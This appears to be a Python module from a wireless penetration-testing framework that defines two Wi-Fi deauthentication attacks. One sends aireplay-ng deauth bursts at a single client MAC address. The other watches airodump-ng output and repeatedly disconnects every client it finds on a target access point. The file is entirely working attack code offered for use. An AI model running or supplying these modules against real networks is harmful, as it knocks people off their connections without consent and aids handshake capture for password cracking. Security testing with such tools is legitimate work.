# -*- coding: UTF-8 -*-
from generic import *


class Deauth(WifiAttackModule):
    """ Deauthenticate the target station connected to the given BSSID given its
         MAC address.
    
    Author:  Yannick Pasquazzo
    Version: 1.0
    """
    config = Config({
        Option(
            'STATION',
            "Target station's MAC address",
            True,
            validate=lambda s, v: re.match(r"(?:[0-9A-F]{2}\:){5}[0-9A-F]{2}", \
                                           v) is not None,
        ): "00:00:00:00:00:00",
    })
    requirements = {'system': ["aireplay-ng"]}
    
    def run(self):
        bssid = self.config.option('BSSID').value
        sta = self.config.option('STATION').value
        mon_if = self.console.state.get('MONITOR_IF')
        self.logger.warning("Deauth station: {}".format(sta))
        cmd = "sudo aireplay-ng -0 5 -a {} -c {} {}".format(bssid, sta, mon_if)
        self.console._jobs.run(cmd)


class DeauthAny(WifiAttackModule):
    """ Deauthenticate any target found connectect to the given BSSID on the
         given channel.
    
    Author:  Yannick Pasquazzo
    Version: 1.0
    """
    config = Config({
        Option(
            'DEAUTH_INTERVAL',
            "Target station deauthentication interval (seconds)",
            False,
        ): 5,
    })
    requirements = {'system': ["aireplay-ng"]}
    
    def run(self):
        self.logger.warning("Press Ctrl+C to interrupt")
        bssid = self.config.option('BSSID').value
        for essid, values in self.console.state['TARGETS'].items():
            if values[0] == bssid:
                ch = values[1]
                break
        deauth_int = self.config.option('DEAUTH_INTERVAL').value
        mon_if = self.console.state.get('MONITOR_IF')
        cmd = "sudo airodump-ng -c {} --bssid {} {}".format(ch, bssid, mon_if)
        t = {}
        # capture packets on the target BSSID
        for line in self.console._jobs.run_iter(cmd):
            self.logger.debug(line)
            _ = STATION_REGEX.search(line)
            # deauthenticate any station found
            if _ is not None:
                station = _.group("station")
                t.setdefault(station, 0)
                if time() - t[station] > deauth_int:
                    self.logger.warning("Deauth station: {}".format(station))
                    c = "sudo aireplay-ng -0 5 -a {} -c {} {}" \
                        .format(bssid, station, mon_if)
                    self.console._jobs.process(c).wait()
                    t[station] = time()
